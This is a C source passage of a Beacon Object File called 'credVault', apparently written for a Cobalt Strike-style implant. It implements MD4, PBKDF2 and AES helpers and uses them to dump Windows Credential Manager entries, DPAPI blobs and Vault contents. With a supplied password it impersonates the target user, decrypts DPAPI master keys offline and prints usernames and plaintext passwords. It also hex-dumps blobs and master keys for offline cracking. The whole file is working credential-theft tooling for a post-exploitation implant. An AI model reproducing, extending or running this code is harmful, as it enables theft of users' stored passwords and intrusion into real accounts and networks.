  MD4_R2(A,B,C,D,0,3);  MD4_R2(D,A,B,C,4,5);  MD4_R2(C,D,A,B,8,9);  MD4_R2(B,C,D,A,12,13);
  MD4_R2(A,B,C,D,1,3);  MD4_R2(D,A,B,C,5,5);  MD4_R2(C,D,A,B,9,9);  MD4_R2(B,C,D,A,13,13);
  MD4_R2(A,B,C,D,2,3);  MD4_R2(D,A,B,C,6,5);  MD4_R2(C,D,A,B,10,9); MD4_R2(B,C,D,A,14,13);
  MD4_R2(A,B,C,D,3,3);  MD4_R2(D,A,B,C,7,5);  MD4_R2(C,D,A,B,11,9); MD4_R2(B,C,D,A,15,13);
  MD4_R3(A,B,C,D,0,3);  MD4_R3(D,A,B,C,8,9);  MD4_R3(C,D,A,B,4,11); MD4_R3(B,C,D,A,12,15);
  MD4_R3(A,B,C,D,2,3);  MD4_R3(D,A,B,C,10,9); MD4_R3(C,D,A,B,6,11); MD4_R3(B,C,D,A,14,15);
  MD4_R3(A,B,C,D,1,3);  MD4_R3(D,A,B,C,9,9);  MD4_R3(C,D,A,B,5,11); MD4_R3(B,C,D,A,13,15);
  MD4_R3(A,B,C,D,3,3);  MD4_R3(D,A,B,C,11,9); MD4_R3(C,D,A,B,7,11); MD4_R3(B,C,D,A,15,15);
  S[0] += A; S[1] += B; S[2] += C; S[3] += D;
}
static void md4_hash(const unsigned char* msg, int n, unsigned char out[16]) {
  unsigned int S[4]; S[0] = 0x67452301; S[1] = 0xefcdab89; S[2] = 0x98badcfe; S[3] = 0x10325476;
  int i = 0;
  while (n - i >= 64) { md4_body(S, msg + i); i += 64; }
  int rem = n - i, j;
  unsigned char pad[128]; xmemcpy(pad, msg + i, rem);
  pad[rem] = 0x80; j = rem + 1;
  while ((j % 64) != 56) pad[j++] = 0;
  unsigned long long bits = (unsigned long long)n * 8;       /* 64-bit little-endian length */
  for (int k = 0; k < 8; k++) pad[j + k] = (unsigned char)((bits >> (8 * k)) & 0xff);
  j += 8;
  int p = 0; while (p < j) { md4_body(S, pad + p); p += 64; }
  for (int k = 0; k < 4; k++) { out[k*4] = (unsigned char)(S[k] & 0xff); out[k*4+1] = (unsigned char)((S[k] >> 8) & 0xff); out[k*4+2] = (unsigned char)((S[k] >> 16) & 0xff); out[k*4+3] = (unsigned char)((S[k] >> 24) & 0xff); }
}

/* ASCII -> UTF-16LE (NUL-terminated) into out; returns byte length incl NUL WCHAR. */
static int a2w(const char* s, unsigned char* out, int cap) {
  int o = 0;
  while (*s && o + 2 < cap) { out[o++] = (unsigned char)*s; out[o++] = 0; s++; }
  out[o++] = 0; out[o++] = 0;
  return o;
}
/* map a CryptoAPI ALG_ID to the CNG algorithm-name string. */
static const char* algName(ALG_ID a) {
  if (a == CALG_SHA_512) return "SHA512";
  if (a == CALG_SHA_256) return "SHA256";
  return "SHA1";
}
/* open a plain (non-HMAC) hash algorithm. NULL on failure. */
static BCRYPT_ALG_HANDLE bcryptOpenPlain(const char* base) {
  unsigned char wn[40]; a2w(base, wn, sizeof(wn));
  BCRYPT_ALG_HANDLE h = NULL;
  if (BCRYPT$BCryptOpenAlgorithmProvider(&h, (LPCWSTR)wn, NULL, 0) != 0) return NULL;
  return h;
}
/* open an HMAC algorithm. NULL on failure. The handle is reused across many
 * CreateHash/DestroyHash calls (cheap) — ideal for PBKDF2's 10k/8k iterations. */
static BCRYPT_ALG_HANDLE bcryptOpenHmac(const char* base) {
  unsigned char wn[40]; a2w(base, wn, sizeof(wn));
  BCRYPT_ALG_HANDLE h = NULL;
  if (BCRYPT$BCryptOpenAlgorithmProvider(&h, (LPCWSTR)wn, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0) return NULL;
  return h;
}
/* HMAC using a pre-opened HMAC algorithm handle (reused across iterations). */
static void bcryptHmac(BCRYPT_ALG_HANDLE hAlg, const unsigned char* key, DWORD klen,
                       const unsigned char* data, DWORD dlen, unsigned char* out, DWORD outcap) {
  BCRYPT_HASH_HANDLE hh = NULL;
  if (BCRYPT$BCryptCreateHash(hAlg, &hh, NULL, 0, (PUCHAR)key, klen, 0) != 0) return;
  BCRYPT$BCryptHashData(hh, (PUCHAR)data, dlen, 0);
  BCRYPT$BCryptFinishHash(hh, out, outcap, 0);
  BCRYPT$BCryptDestroyHash(hh);
}

/* one-shot hash (SHA1). out holds 20 bytes. */
static void cryptoHash(ALG_ID alg, const unsigned char* data, DWORD len, unsigned char* out, DWORD outcap) {
  BCRYPT_ALG_HANDLE h = bcryptOpenPlain(algName(alg));
  if (!h) return;
  BCRYPT_HASH_HANDLE hh = NULL;
  if (BCRYPT$BCryptCreateHash(h, &hh, NULL, 0, NULL, 0, 0) == 0) {
    BCRYPT$BCryptHashData(hh, (PUCHAR)data, len, 0);
    BCRYPT$BCryptFinishHash(hh, out, outcap, 0);
    BCRYPT$BCryptDestroyHash(hh);
  }
  BCRYPT$BCryptCloseAlgorithmProvider(h, 0);
}
/* one-shot HMAC (SHA1/SHA256/SHA512). out holds base-hash-size bytes. */
static void cryptoHmac(ALG_ID base, const unsigned char* key, DWORD klen,
                       const unsigned char* data, DWORD dlen, unsigned char* out, DWORD outcap) {
  BCRYPT_ALG_HANDLE h = bcryptOpenHmac(algName(base));
  if (!h) return;
  bcryptHmac(h, key, klen, data, dlen, out, outcap);
  BCRYPT$BCryptCloseAlgorithmProvider(h, 0);
}
/* HMAC reusing a caller-provided HMAC alg handle (PBKDF2 loops). The `base`
 * arg is retained for call-site compatibility (the handle already encodes it). */
static void hmacWithProv(BCRYPT_ALG_HANDLE hAlg, ALG_ID base, const unsigned char* key, DWORD klen,
                         const unsigned char* data, DWORD dlen, unsigned char* out, DWORD outcap) {
  bcryptHmac(hAlg, key, klen, data, dlen, out, outcap);
}

/* AES-256-CBC decrypt in place, no padding strip. *plen in/out (== result len).
 * NOTE: BCryptDecrypt uses pbIV as working storage and writes to it, so the IV
 * buffer must be writable (callers pass writable BYTE[] buffers). */
static int cryptoAes256Dec(const unsigned char* key32, unsigned char* iv16,
                           unsigned char* data, DWORD* plen) {
  unsigned char algW[16]; a2w("AES", algW, sizeof(algW));
  BCRYPT_ALG_HANDLE hAlg = NULL;
  if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, (LPCWSTR)algW, NULL, 0) != 0) return 0;
  unsigned char propW[40]; int propLen = a2w("ChainingMode", propW, sizeof(propW));
  unsigned char modeW[40]; int modeLen = a2w("ChainingModeCBC", modeW, sizeof(modeW));
  BCRYPT$BCryptSetProperty((BCRYPT_HANDLE)hAlg, (LPCWSTR)propW, modeW, modeLen, 0);
  int ok = 0;
  BCRYPT_KEY_HANDLE hKey = NULL;
  if (BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key32, 32, 0) == 0) {
    ULONG r = 0;
    if (BCRYPT$BCryptDecrypt(hKey, (PUCHAR)data, *plen, NULL, iv16, 16, (PUCHAR)data, *plen, &r, 0) == 0) {
      *plen = r; ok = 1;
    }
    BCRYPT$BCryptDestroyKey(hKey);
  }
  BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
  return ok;
}

/* PBKDF2-HMAC-SHA256 (RFC 8018). salt up to ~240 bytes (a SID as UTF-16LE is
 * ~94 bytes). Acquires ONE provider for the run. outlen up to 32*blocks; one
 * 32-byte block per i (enough for dklen<=32). */
static void pbkdf2_sha256(const unsigned char* password, DWORD plen,
                          const unsigned char* salt, DWORD slen, DWORD iters,
                          unsigned char* out, DWORD outlen) {
  if (slen > 240) return;
  BCRYPT_ALG_HANDLE hAlg = bcryptOpenHmac("SHA256");
  if (!hAlg) return;
  DWORD blocks = (outlen + 31) / 32;
  if (blocks == 0) blocks = 1;
  for (DWORD b = 1; b <= blocks; b++) {
    BYTE U[256]; xmemcpy(U, salt, slen); U[slen] = 0; U[slen + 1] = 0; U[slen + 2] = 0; U[slen + 3] = (BYTE)b; /* INT32_BE(b) */
    BYTE T[32]; hmacWithProv(hAlg, CALG_SHA_256, password, plen, U, slen + 4, T, 32);
    BYTE acc[32]; xmemcpy(acc, T, 32);
    for (DWORD j = 1; j < iters; j++) {
      BYTE U2[32]; hmacWithProv(hAlg, CALG_SHA_256, password, plen, T, 32, U2, 32);
      for (int k = 0; k < 32; k++) acc[k] ^= U2[k];
      xmemcpy(T, U2, 32);
    }
    DWORD copy = (b == blocks && (outlen % 32)) ? (outlen % 32) : 32;
    xmemcpy(out + (b - 1) * 32, acc, copy);
  }
  BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
}

/* 16-byte LE GUID -> master-key filename (lowercase, hyphenated, no braces). */
static void mkGuidFilename(const unsigned char* g, char* out) {
  int o = 0, i;
  for (i = 3; i >= 0; i--) { out[o++] = nibL(g[i] >> 4); out[o++] = nibL(g[i] & 0xf); }
  out[o++] = '-';
  for (i = 5; i >= 4; i--) { out[o++] = nibL(g[i] >> 4); out[o++] = nibL(g[i] & 0xf); }
  out[o++] = '-';
  for (i = 7; i >= 6; i--) { out[o++] = nibL(g[i] >> 4); out[o++] = nibL(g[i] & 0xf); }
  out[o++] = '-';
  for (i = 8; i <= 9; i++) { out[o++] = nibL(g[i] >> 4); out[o++] = nibL(g[i] & 0xf); }
  out[o++] = '-';
  for (i = 10; i <= 15; i++) { out[o++] = nibL(g[i] >> 4); out[o++] = nibL(g[i] & 0xf); }
  out[o] = 0;
}

/* parse DPAPI_BLOB at b+off; extract GuidMasterKey(16), the CryptAlgo/HashAlgo
 * IDs, Salt, and Data. The algorithm IDs are read from the blob (not assumed) so
 * the BOF adapts to whatever DPAPI crypto the target box uses. */
static int parseDpapiBlob(const unsigned char* b, DWORD total, DWORD off,
                         unsigned char mkGuid[16],
                         ALG_ID* cryptAlgo, ALG_ID* hashAlgo,
                         const unsigned char** salt, DWORD* saltLen,
                         const unsigned char** data, DWORD* dataLen) {
  DWORD c = off;
  if (c + 4 > total) return 0; c += 4;            /* Version */
  if (c + 16 > total) return 0; c += 16;          /* GuidCredential */
  if (c + 4 > total) return 0; c += 4;            /* MasterKeyVersion */
  if (c + 16 > total) return 0; xmemcpy(mkGuid, b + c, 16); c += 16;  /* GuidMasterKey */
  if (c + 4 > total) return 0; c += 4;            /* Flags */
  if (c + 4 > total) return 0; { DWORD L = *(DWORD*)(b + c); c += 4; if (c + L > total) return 0; c += L; } /* Desc */
  if (c + 8 > total) return 0; if (cryptAlgo) *cryptAlgo = *(DWORD*)(b + c); c += 8;  /* CryptAlgo + CryptAlgoLen */
  if (c + 4 > total) return 0; { DWORD L = *(DWORD*)(b + c); c += 4; if (c + L > total) return 0; if (salt) *salt = b + c; if (saltLen) *saltLen = L; c += L; }
  if (c + 4 > total) return 0; { DWORD L = *(DWORD*)(b + c); c += 4; if (c + L > total) return 0; c += L; } /* HMacKey */
  if (c + 8 > total) return 0; if (hashAlgo) *hashAlgo = *(DWORD*)(b + c); c += 8;    /* HashAlgo + HashAlgoLen */
  if (c + 4 > total) return 0; { DWORD L = *(DWORD*)(b + c); c += 4; if (c + L > total) return 0; c += L; } /* HMac */
  if (c + 4 > total) return 0; { DWORD L = *(DWORD*)(b + c); c += 4; if (c + L > total) return 0; if (data) *data = b + c; if (dataLen) *dataLen = L; c += L; }
  return 1;
}

/* find the SID-named subfolder under <roam>\Microsoft\Protect\ */
static int findSid(const char* roam, char* sidOut, int sidCap) {
  char dir[600]; int p = 0;
  p = appends(dir, p, sizeof(dir) - 2, roam);
  p = appends(dir, p, sizeof(dir) - 2, "\\Microsoft\\Protect\\*");
  dir[p] = 0;
  WIN32_FIND_DATAA fd; xmemset(&fd, 0, sizeof(fd));
  HANDLE h = KERNEL32$FindFirstFileA(dir, &fd);
  if (h == INVALID_HANDLE_VALUE) return 0;
  int found = 0;
  do {
    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
    if (fd.cFileName[0] == 'S') {
      int i = 0; while (fd.cFileName[i] && i < sidCap - 1) { sidOut[i] = fd.cFileName[i]; i++; }
      sidOut[i] = 0; found = 1; break;
    }
  } while (KERNEL32$FindNextFileA(h, &fd));
  KERNEL32$FindClose(h);
  return found;
}

/* Decrypt the master key with a candidate password-derived key; verify via the
 * master-key HMAC. prfBase = SHA512 for the SHA512/AES256 combo. Returns 1 + 64B
 * decryptedMK on success. */
static int decryptMasterKey(const unsigned char* key, DWORD keyLen,
                            const unsigned char* mkSalt, DWORD rounds, ALG_ID prfBase,
                            const unsigned char* mkdata, DWORD mkdataLen,
                            unsigned char decryptedMK[64]) {
  if (mkdataLen < 80 || mkdataLen > 4096) return 0;
  /* Open ONE HMAC algorithm for the whole PBKDF2 run (8000 HMACs) — opening/closing
   * per iteration would be far too slow in a beacon. The handle encodes prfBase. */
  BCRYPT_ALG_HANDLE hAlg = bcryptOpenHmac(algName(prfBase));
  if (!hAlg) return 0;
  BYTE keyMat[64];
  BYTE U[20]; xmemcpy(U, mkSalt, 16); U[16] = 0; U[17] = 0; U[18] = 0; U[19] = 1; /* INT32_BE(1) */
  hmacWithProv(hAlg, prfBase, key, keyLen, U, 20, keyMat, 64);
  BYTE tmp[64];
  for (DWORD r = 1; r < rounds; r++) {
    hmacWithProv(hAlg, prfBase, key, keyLen, keyMat, 64, tmp, 64);
    for (int k = 0; k < 64; k++) keyMat[k] ^= tmp[k];
  }
  unsigned char* mkClear = (unsigned char*)intAlloc(mkdataLen);
  int good = 0;
  if (mkClear) {
    xmemcpy(mkClear, mkdata, mkdataLen);
    DWORD mcl = mkdataLen;
    int ok = cryptoAes256Dec(keyMat, keyMat + 32, mkClear, &mcl);
    if (ok && mcl >= 64) {
      xmemcpy(decryptedMK, mkClear + mcl - 64, 64);
      /* HMAC verify: hmacSalt=mkClear[:16], hmac=mkClear[16:32], hmacKey=HMAC(prf,key,salt), calc=HMAC(prf,hmacKey,MK) */
      BYTE hmacKey[64]; hmacWithProv(hAlg, prfBase, key, keyLen, mkClear, 16, hmacKey, 64);
      BYTE calc[64];    hmacWithProv(hAlg, prfBase, hmacKey, 64, decryptedMK, 64, calc, 64);
      if (xmemcmp(calc, mkClear + 16, 16) == 0) good = 1;
    }
    intFree(mkClear);
  }
  BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
  return good;
}

/* Path D: locate Roaming credman blob, read matching master key, derive key from
 * password+SID, decrypt MK (key2 then key1), decrypt blob, parse the credential. */
static void offlineDpapiDecrypt(const char* password) {
  BeaconPrintf(CALLBACK_OUTPUT, "=== Path D: offline DPAPI decrypt (password + SID + on-disk master key) ===\n");
  if (!password || !password[0]) { BeaconPrintf(CALLBACK_OUTPUT, "  (skipped: needs -p)\n"); return; }

  char roam[260];
  HRESULT hr = SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roam);
  if (hr != 0) { BeaconPrintf(CALLBACK_ERROR, "[-] SHGetFolderPathA(APPDATA) hr=0x%lx\n", (unsigned long)hr); return; }
  char sid[256]; sid[0] = 0;
  int haveSid = findSid(roam, sid, sizeof(sid));
  if (haveSid) BeaconPrintf(CALLBACK_OUTPUT, "[*] SID = %s\n", sid);

  /* UTF-16LE encodings of password and SID+"\0" (used for key derivation) */
  int pwlen = xlen(password);
  BYTE pwUtf16[1024]; int pul = 0;
  for (int i = 0; i < pwlen && pul + 2 <= (int)sizeof(pwUtf16); i++) { pwUtf16[pul++] = (BYTE)password[i]; pwUtf16[pul++] = 0; }
  BYTE sidUtf16[600]; int sul = 0;
  if (haveSid) {
    int slen = xlen(sid);
    for (int i = 0; i < slen && sul + 2 <= (int)sizeof(sidUtf16); i++) { sidUtf16[sul++] = (BYTE)sid[i]; sidUtf16[sul++] = 0; }
    sidUtf16[sul++] = 0; sidUtf16[sul++] = 0; /* trailing NUL char */
  }
  BYTE md4[16], sha1pw[20];
  md4_hash(pwUtf16, pul, md4);                          /* MD4/NTLM hash (manual; CNG has no MD4) */
  cryptoHash(CALG_SHA1, pwUtf16, pul, sha1pw, 20);
  /* The Protected-Users PBKDF2 salt is the SID encoded as UTF-16LE WITHOUT a
   * trailing null (impacket: sid.encode('utf-16le')). sidUtf16 holds the SID as
   * UTF-16LE PLUS a trailing NUL WCHAR for the key1/key2 HMAC data, so the
   * PBKDF2 salt is sidUtf16[0 .. sul-2]. */
  int saltLen = (sul >= 2) ? (sul - 2) : 0;
  BYTE key1[20], key2[20], key3[20];
  cryptoHmac(CALG_SHA1, sha1pw, 20, sidUtf16, sul, key1, 20);   /* SHA1 route */
  cryptoHmac(CALG_SHA1, md4,     16, sidUtf16, sul, key2, 20);   /* MD4/NTLM route */
  /* key3 — Protected Users route (PBKDF2-SHA256). tmpKey=PBKDF2(MD4(pw),SID.utf16le,10000,32);
   * tmpKey2=PBKDF2(tmpKey,SID.utf16le,1,16); key3=HMAC-SHA1(tmpKey2, UTF16LE(SID+"\0")). */
  int haveKey3 = 0;
  if (haveSid && saltLen > 0) {
    BYTE tmpKey[32], tmpKey2[16];
    pbkdf2_sha256(md4,    16, sidUtf16, saltLen, 10000, tmpKey, 32);
    pbkdf2_sha256(tmpKey, 32, sidUtf16, saltLen, 1,     tmpKey2, 16);
    cryptoHmac(CALG_SHA1, tmpKey2, 16, sidUtf16, sul, key3, 20);
    haveKey3 = 1;
  }

  char cdir[600]; int p = 0;
  p = appends(cdir, p, sizeof(cdir) - 2, roam);
  p = appends(cdir, p, sizeof(cdir) - 2, "\\Microsoft\\Credentials\\*");
  cdir[p] = 0;
  WIN32_FIND_DATAA fd; xmemset(&fd, 0, sizeof(fd));
  HANDLE h = KERNEL32$FindFirstFileA(cdir, &fd);
  if (h == INVALID_HANDLE_VALUE) { BeaconPrintf(CALLBACK_OUTPUT, "[-] no on-disk credman blob under %s\\Microsoft\\Credentials\n", roam); return; }
  int n = 0;
  do {
    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
    char path[600]; int q = 0;
    q = appends(path, q, sizeof(path) - 2, roam);
    q = appends(path, q, sizeof(path) - 2, "\\Microsoft\\Credentials\\");
    q = appends(path, q, sizeof(path) - 2, fd.cFileName);
    path[q] = 0;
    unsigned char* blob = NULL; DWORD blen = 0;
    if (!read_file(path, &blob, &blen, 262144)) { BeaconPrintf(CALLBACK_ERROR, "  [-] read %s failed\n", fd.cFileName); continue; }
    BeaconPrintf(CALLBACK_OUTPUT, "--- offline blob: %s (%lu bytes) ---\n", fd.cFileName, blen);

    DWORD boff = 0;
    if (blen >= 16) {
      DWORD ver = *(DWORD*)(blob + 0), sz = *(DWORD*)(blob + 4);
      if (ver == 1 && sz == blen - 12) boff = 12;   /* 12-byte CRED wrapper (U17) */
    }
    unsigned char mkGuid[16];
    const unsigned char *bsalt = NULL, *bdata = NULL; DWORD bsaltLen = 0, bdataLen = 0;
    ALG_ID blobCryptAlgo = 0, blobHashAlgo = 0;
    if (!parseDpapiBlob(blob, blen, boff, mkGuid, &blobCryptAlgo, &blobHashAlgo, &bsalt, &bsaltLen, &bdata, &bdataLen)) {
      BeaconPrintf(CALLBACK_ERROR, "  [-] DPAPI blob parse failed\n"); intFree(blob); continue;
    }
    char mkfn[64]; mkGuidFilename(mkGuid, mkfn);
    BeaconPrintf(CALLBACK_OUTPUT, "  GuidMasterKey: %s  blob CryptAlgo=0x%lx HashAlgo=0x%lx\n",
                 mkfn, (unsigned long)blobCryptAlgo, (unsigned long)blobHashAlgo);
    if (!haveSid) { BeaconPrintf(CALLBACK_ERROR, "  [-] no SID -> cannot derive key\n"); intFree(blob); continue; }

    char mkpath[700]; int mp = 0;
    mp = appends(mkpath, mp, sizeof(mkpath) - 2, roam);
    mp = appends(mkpath, mp, sizeof(mkpath) - 2, "\\Microsoft\\Protect\\");
    mp = appends(mkpath, mp, sizeof(mkpath) - 2, sid);
    mp = appends(mkpath, mp, sizeof(mkpath) - 2, "\\");
    mp = appends(mkpath, mp, sizeof(mkpath) - 2, mkfn);
    mkpath[mp] = 0;
    unsigned char* mk = NULL; DWORD mklen = 0;
    if (!read_file(mkpath, &mk, &mklen, 8192)) {
      BeaconPrintf(CALLBACK_ERROR, "  [-] master key %s not found at %s\n", mkfn, mkpath); intFree(blob); continue;
    }
    if (mklen < 128 + 32) { BeaconPrintf(CALLBACK_ERROR, "  [-] master key file too short\n"); intFree(blob); intFree(mk); continue; }
    DWORD mkl = *(DWORD*)(mk + 96);                 /* MasterKeyLen (low DWORD of QWORD at header offset 96) */
    if (mkl < 32 || 128 + mkl > mklen) { BeaconPrintf(CALLBACK_ERROR, "  [-] bad MasterKeyLen %lu\n", mkl); intFree(blob); intFree(mk); continue; }
    const unsigned char* mkSalt = mk + 128 + 4;
    DWORD rounds = *(DWORD*)(mk + 128 + 20);
    ALG_ID mkHashAlgo = *(DWORD*)(mk + 128 + 24);
    ALG_ID mkCryptAlgo = *(DWORD*)(mk + 128 + 28);
    const unsigned char* mkdata = mk + 128 + 32;
    DWORD mkdataLen = mkl - 32;
    BeaconPrintf(CALLBACK_OUTPUT, "  MK: rounds=%lu HashAlgo=0x%lx CryptAlgo=0x%lx dataLen=%lu\n",
                 rounds, (unsigned long)mkHashAlgo, (unsigned long)mkCryptAlgo, mkdataLen);
    /* The MK PBKDF2 below derives one 64-byte hash block, so it needs the SHA512
     * hash (64-byte block) + AES-256 cipher — the Win10+/Server 2016+ DPAPI
     * default, universal across modern boxes. Older 3DES/SHA1 DPAPI is not wired
     * (it would need a multi-block derivation + 3DES); dump for offline decrypt. */
    if (mkHashAlgo != CALG_SHA_512 || mkCryptAlgo != CALG_AES_256) {
      BeaconPrintf(CALLBACK_ERROR, "  [-] unsupported MK alg combo (need SHA512+AES256; this box uses 0x%lx+0x%lx) — dump for offline\n",
                   (unsigned long)mkHashAlgo, (unsigned long)mkCryptAlgo);
      BeaconPrintf(CALLBACK_OUTPUT, "  SID=%s\n  [BLOB %lu bytes]\n", sid, blen); printHexAscii(blob, blen, 262144);
      BeaconPrintf(CALLBACK_OUTPUT, "  [MASTERKEY %lu bytes]\n", mklen); printHexAscii(mk, mklen, 8192);
      intFree(blob); intFree(mk); continue;
    }

    BYTE decryptedMK[64]; int mkok = 0; const char* usedKey = "(none)";
    if (haveKey3 && decryptMasterKey(key3, 20, mkSalt, rounds, mkHashAlgo, mkdata, mkdataLen, decryptedMK)) { mkok = 1; usedKey = "key3 (PBKDF2-SHA256 / Protected Users route)"; }
    else if (decryptMasterKey(key2, 20, mkSalt, rounds, mkHashAlgo, mkdata, mkdataLen, decryptedMK)) { mkok = 1; usedKey = "key2 (MD4/NTLM route)"; }
    else if (decryptMasterKey(key1, 20, mkSalt, rounds, mkHashAlgo, mkdata, mkdataLen, decryptedMK)) { mkok = 1; usedKey = "key1 (SHA1 route)"; }
    if (!mkok) {
      BeaconPrintf(CALLBACK_ERROR, "  [!] master key did not decrypt with any on-box route (key3/key2/key1).\n");
      BeaconPrintf(CALLBACK_OUTPUT, "  -- dumping blob + master key for offline decrypt (save these hex blobs) --\n");
      BeaconPrintf(CALLBACK_OUTPUT, "  SID=%s\n", sid);
      BeaconPrintf(CALLBACK_OUTPUT, "  [BLOB %lu bytes]\n", blen);
      printHexAscii(blob, blen, 262144);
      BeaconPrintf(CALLBACK_OUTPUT, "  [MASTERKEY %lu bytes]\n", mklen);
      printHexAscii(mk, mklen, 8192);
      intFree(blob); intFree(mk); continue;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  [+] master key decrypted via %s\n", usedKey);

    /* decrypt the credential blob. The session-key HMAC uses the blob's own
     * HashAlgo (read from the blob, not assumed); the AES-256 key is the first
     * 32 bytes of that HMAC, so the hash must yield >=32 bytes (SHA512=64,
     * SHA256=32). The cipher must be AES-256 (the Win10+ default). */
    if (blobCryptAlgo != CALG_AES_256 || (blobHashAlgo != CALG_SHA_512 && blobHashAlgo != CALG_SHA_256)) {
      BeaconPrintf(CALLBACK_ERROR, "  [-] unsupported blob alg combo (need AES256 + SHA512/SHA256; blob uses 0x%lx+0x%lx) — dump for offline\n",
                   (unsigned long)blobCryptAlgo, (unsigned long)blobHashAlgo);
      BeaconPrintf(CALLBACK_OUTPUT, "  SID=%s\n  [BLOB %lu bytes]\n", sid, blen); printHexAscii(blob, blen, 262144);
      intFree(blob); intFree(mk); continue;
    }
    BYTE keyHash[20]; cryptoHash(CALG_SHA1, decryptedMK, 64, keyHash, 20);
    BYTE sessionKey[64]; cryptoHmac(blobHashAlgo, keyHash, 20, bsalt, bsaltLen, sessionKey, 64);
    unsigned char* bc = (unsigned char*)intAlloc(bdataLen);
    if (!bc) { intFree(blob); intFree(mk); continue; }
    xmemcpy(bc, bdata, bdataLen);
    DWORD bcl = bdataLen;
    BYTE zeroIV[16]; xmemset(zeroIV, 0, 16);
    if (!cryptoAes256Dec(sessionKey, zeroIV, bc, &bcl)) {
      BeaconPrintf(CALLBACK_ERROR, "  [-] blob AES decrypt failed\n"); intFree(blob); intFree(mk); intFree(bc); continue;
    }
    DWORD realLen = bcl;
    if (bcl > 0) { BYTE pad = bc[bcl - 1]; if (pad >= 1 && pad <= 16 && pad <= bcl) realLen = bcl - pad; }
    BeaconPrintf(CALLBACK_OUTPUT, "  [+] credential blob decrypted (%lu bytes)\n", realLen);

    /* parse CREDENTIAL_BLOB: 48-byte header, then length-prefixed UTF-16 strings */
    static const char* labels[3] = { "TargetName", "UserName", "CredentialBlob(password)" };
    DWORD o = 48; int idx = 0;
    while (o + 4 <= realLen) {
      DWORD L = *(DWORD*)(bc + o); o += 4;
      if (L > realLen - o) break;
      if (L > 1) {
        char sbuf[1024]; int si = 0;
        for (DWORD j = 0; j + 1 < L && si < (int)sizeof(sbuf) - 1; j += 2) {
          char ch = (char)bc[o + j];
          sbuf[si++] = (ch >= 0x20 && ch < 0x7f) ? ch : '.';
        }
        sbuf[si] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: %s\n", (idx < 3) ? labels[idx] : "extra", sbuf);
        idx++;
      }
      o += L;
    }
    /* fallback: dump hex+UTF-16 so creds are visible even if the structured parse is off */
    BeaconPrintf(CALLBACK_OUTPUT, "  -- raw decrypted dump --\n");
    printHexAscii(bc, realLen, 4096);
    printUtf16(bc, realLen);

    intFree(bc); intFree(blob); intFree(mk);
    n++;
  } while (KERNEL32$FindNextFileA(h, &fd));
  KERNEL32$FindClose(h);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] offline DPAPI: %d blob(s) processed\n", n);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* filter = BeaconDataExtract(&p, NULL); if (filter && !*filter) filter = NULL;
  char* user   = BeaconDataExtract(&p, NULL); if (user   && !*user)   user   = NULL;
  char* pass   = BeaconDataExtract(&p, NULL); if (pass   && !*pass)   pass   = NULL;
  char* domain = BeaconDataExtract(&p, NULL); if (domain && !*domain) domain = NULL;

  /* beacon context (before any impersonation) — confirms the host/profile. */
  char uname[256]; DWORD ulen = sizeof(uname); uname[0] = 0;
  if (ADVAPI32$GetUserNameA(uname, &ulen) && uname[0]) BeaconPrintf(CALLBACK_OUTPUT, "[*] credVault — beacon user: %s\n", uname);
  else                                                  BeaconPrintf(CALLBACK_OUTPUT, "[*] credVault — current-user Credential Manager + DPAPI + Vault dump\n");
  if (filter) BeaconPrintf(CALLBACK_OUTPUT, "[*] filter: %s\n", filter);

  /* If creds provided, switch to an interactive logon token for that user so the
   * credman/vault is actually loaded (the whole point of -u/-p on a type-3 beacon).
   * -u may carry the domain ("DOMAIN\user" / "user@DOMAIN"); an explicit non-empty
   * -d still takes precedence. */
  const char* imu = user; const char* imd = domain;
  if (user) parseUserDomain(user, &imu, &imd);
  if (domain && domain[0]) imd = domain;
  HANDLE hTok = NULL;
  if (imu && pass) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] impersonation request: %s\\%s\n",
                 (imd && imd[0]) ? imd : ".", imu ? imu : "");
    hTok = spawnImpersonationToken(imu, imd, pass);
  } else {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] no -u/-p given — beacon context only (type-3 logon: credman/vault will be empty)\n");
  }

  BeaconPrintf(CALLBACK_OUTPUT, "=== Path A: CredEnumerate (current user credman) ===\n");
  dumpCredman(filter);
  BeaconPrintf(CALLBACK_OUTPUT, "=== Path B: on-disk legacy DPAPI blobs (LOCALAPPDATA + APPDATA\\Microsoft\\Credentials) ===\n");
  dumpOnDisk(filter);
  BeaconPrintf(CALLBACK_OUTPUT, "=== Path C: modern Vault (vaultcli) ===\n");
  dumpVault(filter);

  /* Path D: offline DPAPI — needs the user's password to derive the master-key
   * key from password+SID. Runs while still impersonated so SHGetFolderPathA
   * resolves the target user's Roaming profile and read_file hits their files. */
  if (imu && pass) {
    offlineDpapiDecrypt(pass);
  }

  if (hTok) { ADVAPI32$RevertToSelf(); KERNEL32$CloseHandle(hTok); }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] credVault done\n");
}